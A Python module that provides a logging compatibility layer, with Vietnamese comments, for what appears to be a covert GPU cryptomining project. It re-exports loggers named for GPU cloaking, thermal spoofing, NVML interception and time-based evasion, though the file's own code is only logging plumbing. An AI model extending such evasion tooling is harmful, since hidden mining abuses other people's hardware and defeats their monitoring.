#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Logging Compatibility Layer for Gradual Migration
=================================================
**Compatibility layer** (lớp tương thích) cho việc di chuyển dần dần từ hệ thống logging cũ sang mới.

This module provides backward compatibility imports to ensure smooth migration
from the old 4-module logging system to the new 2-module architecture.

Migration Path:
    Old: unified_logging.py + unified_log_aggregator.py + module_loggers.py + logging_config.py
    New: logging_config.py (Enhanced Core) + module_loggers.py (Domain Facade)
"""

import warnings
import logging
from pathlib import Path
from typing import Optional, Dict, Any

# Import từ module mới
from mining_environment.scripts.logging_config import setup_logging
from mining_environment.scripts.module_loggers import (
    # Legacy loggers
    get_gpu_plugin_logger,
    get_gpu_cloaking_logger,
    get_gpu_optimization_logger,
    get_mining_performance_logger,
    get_audit_integration_logger,
    get_gpu_monitoring_logger,
    
    # New GPU component loggers
    get_stealth_inference_logger,
    get_coordination_logger,
    get_registry_logger,
    get_resource_manager_logger,
    get_resource_control_logger,
    get_thermal_logger,
    get_timing_logger,
    get_environment_logger,
    get_nvml_logger,
    get_proxy_daemon_logger,
    get_stealth_monitor_logger,
    get_dashboard_logger,
    get_pid_logger,
    get_utility_logger,
    
    # Aliases for compatibility
    get_gpu_stealth_logger,
    get_gpu_monitor_logger,
    
    # Domain-specific methods
    log_thermal_spoofing,
    log_plugin_lifecycle,
    log_gpu_cloaking,
    log_nvml_interception,
    log_time_based_evasion,
)

# ===== COMPATIBILITY MAPPINGS =====
# **Mapping** (ánh xạ) từ tên cũ sang tên mới

LEGACY_MAPPINGS = {
    # Các hàm từ unified_logging.py
    'setup_unified_logging': 'setup_logging',
    'get_unified_logger': 'setup_logging',
    
    # Các hàm từ unified_log_aggregator.py  
    'aggregate_logs': None,  # Sẽ được xử lý trong logging_config mới
    'start_aggregation': None,  # Event-driven trong module mới
    'stop_aggregation': None,  # Tự động cleanup
    
    # Mapping cho các logger cũ có thể có tên khác
    'get_stealth_logger': 'get_stealth_inference_logger',
    'get_coordinator_logger': 'get_coordination_logger',
    'get_gpu_resource_logger': 'get_resource_manager_logger',
}

# ===== DEPRECATION WARNINGS =====
# **Deprecation warnings** (cảnh báo lỗi thời) cho các API cũ

def show_deprecation_warning(old_name: str, new_name: str = None):
    """
    Hiển thị **deprecation warning** (cảnh báo lỗi thời) cho API cũ.
    
    Args:
        old_name: Tên API cũ
        new_name: Tên API mới (nếu có)
    """
    if new_name:
        message = (
            f"⚠️ '{old_name}' is deprecated and will be removed in v2.0. "
            f"Please use '{new_name}' instead."
        )
    else:
        message = (
            f"⚠️ '{old_name}' is deprecated and no longer needed in the new architecture. "
            f"This functionality is now handled automatically."
        )
    
    warnings.warn(message, DeprecationWarning, stacklevel=2)

# ===== COMPATIBILITY FUNCTIONS =====
# Các hàm **wrapper** (hàm bọc) để tương thích ngược

def setup_unified_logging(
    log_name: str = 'unified',
    log_file: str = None,
    level: str = 'INFO'
) -> logging.Logger:
    """
    **Legacy compatibility wrapper** (hàm bọc tương thích cũ) cho setup_unified_logging.
    
    Chuyển hướng sang setup_logging() mới.
    """
    show_deprecation_warning('setup_unified_logging', 'setup_logging')
    
    if not log_file:
        log_file = f'/app/mining_environment/logs/{log_name}.log'
    
    return setup_logging(log_name, log_file, level)

def get_unified_logger() -> logging.Logger:
    """
    **Legacy compatibility wrapper** cho get_unified_logger.
    
    Trả về unified logger cho backward compatibility.
    """
    show_deprecation_warning('get_unified_logger', 'setup_logging')
    return setup_logging('unified', '/app/mining_environment/logs/unified.log', 'INFO')

def aggregate_logs(source_dir: str = None, output_file: str = None) -> bool:
    """
    **Legacy compatibility wrapper** cho aggregate_logs.
    
    Function này không còn cần thiết trong kiến trúc mới.
    Aggregation được xử lý tự động qua event-driven approach.
    """
    show_deprecation_warning('aggregate_logs', None)
    # Return True để không break code cũ
    return True

def start_aggregation(interval: int = 5) -> bool:
    """
    **Legacy compatibility wrapper** cho start_aggregation.
    
    Aggregation tự động bắt đầu trong module mới.
    """
    show_deprecation_warning('start_aggregation', None)
    return True

def stop_aggregation() -> bool:
    """
    **Legacy compatibility wrapper** cho stop_aggregation.
    
    Cleanup tự động xử lý trong module mới.
    """
    show_deprecation_warning('stop_aggregation', None)
    return True

# ===== SMART IMPORT RESOLVER =====
# **Smart resolver** (bộ giải quyết thông minh) để xử lý import cũ

class LegacyImportResolver:
    """
    **Import resolver** (bộ giải quyết import) để chuyển đổi import cũ sang mới.
    """
    
    @staticmethod
    def resolve(module_path: str, function_name: str) -> Optional[Any]:
        """
        Resolve **legacy import** (import cũ) sang function mới.
        
        Args:
            module_path: Path của module cũ
            function_name: Tên function cần import
            
        Returns:
            Function mới hoặc wrapper tương thích
        """
        # Check trong mapping
        if function_name in LEGACY_MAPPINGS:
            new_name = LEGACY_MAPPINGS[function_name]
            if new_name:
                # Lấy function mới từ globals
                if new_name in globals():
                    show_deprecation_warning(function_name, new_name)
                    return globals()[new_name]
        
        # Check các compatibility wrapper
        if function_name in globals():
            return globals()[function_name]
        
        return None

# ===== MIGRATION HELPERS =====
# **Helper functions** (hàm trợ giúp) cho quá trình migration

def check_migration_readiness() -> Dict[str, bool]:
    """
    Kiểm tra **migration readiness** (sẵn sàng di chuyển).
    
    Returns:
        Dict với status của từng component
    """
    readiness = {
        'logging_config_ready': False,
        'module_loggers_ready': False,
        'compatibility_layer_ready': True,
        'legacy_modules_identified': False,
        'performance_baseline_captured': False,
    }
    
    # Check logging_config
    try:
        from mining_environment.scripts.logging_config import setup_logging
        readiness['logging_config_ready'] = True
    except ImportError:
        pass
    
    # Check module_loggers
    try:
        from mining_environment.scripts import module_loggers
        # Kiểm tra Phase 2 completion
        if hasattr(module_loggers, 'validate_phase_2_completion'):
            if module_loggers.validate_phase_2_completion():
                readiness['module_loggers_ready'] = True
    except ImportError:
        pass
    
    return readiness

def get_migration_status() -> Dict[str, Any]:
    """
    Lấy **migration status** (trạng thái di chuyển) hiện tại.
    
    Returns:
        Dict với thông tin migration
    """
    return {
        'phase': 'Phase 3: Migration',
        'compatibility_layer': 'Active',
        'deprecation_warnings': 'Enabled',
        'legacy_support': 'Full',
        'readiness': check_migration_readiness(),
        'next_steps': [
            'Update imports in affected modules',
            'Run performance tests',
            'Monitor deprecation warnings',
            'Plan Phase 4: Cleanup'
        ]
    }

# ===== MODULE INITIALIZATION =====
# Khởi tạo compatibility layer

def initialize_compatibility_layer():
    """
    Initialize **compatibility layer** (khởi tạo lớp tương thích).
    """
    status = get_migration_status()
    
    # Log initialization (sử dụng logger mới)
    logger = setup_logging('migration', '/app/mining_environment/logs/migration.log', 'INFO')
    logger.info("=" * 60)
    logger.info("🔄 Logging Migration - Compatibility Layer Initialized")
    logger.info(f"📊 Status: {status['phase']}")
    logger.info(f"✅ Readiness: {status['readiness']}")
    logger.info("=" * 60)
    
    return status

# Auto-initialize khi import
_migration_status = initialize_compatibility_layer()

# ===== EXPORTS =====
__all__ = [
    # Compatibility functions
    'setup_unified_logging',
    'get_unified_logger',
    'aggregate_logs',
    'start_aggregation',
    'stop_aggregation',
    
    # Migration helpers
    'check_migration_readiness',
    'get_migration_status',
    'LegacyImportResolver',
    
    # Re-export all từ module_loggers
    'setup_logging',
    'get_gpu_plugin_logger',
    'get_gpu_cloaking_logger',
    'get_gpu_optimization_logger',
    'get_mining_performance_logger',
    'get_audit_integration_logger',
    'get_gpu_monitoring_logger',
    'get_stealth_inference_logger',
    'get_coordination_logger',
    'get_registry_logger',
    'get_resource_manager_logger',
    'get_resource_control_logger',
    'get_thermal_logger',
    'get_timing_logger',
    'get_environment_logger',
    'get_nvml_logger',
    'get_proxy_daemon_logger',
    'get_stealth_monitor_logger',
    'get_dashboard_logger',
    'get_pid_logger',
    'get_utility_logger',
    'get_gpu_stealth_logger',
    'get_gpu_monitor_logger',
    'log_thermal_spoofing',
    'log_plugin_lifecycle',
    'log_gpu_cloaking',
    'log_nvml_interception',
    'log_time_based_evasion',
]
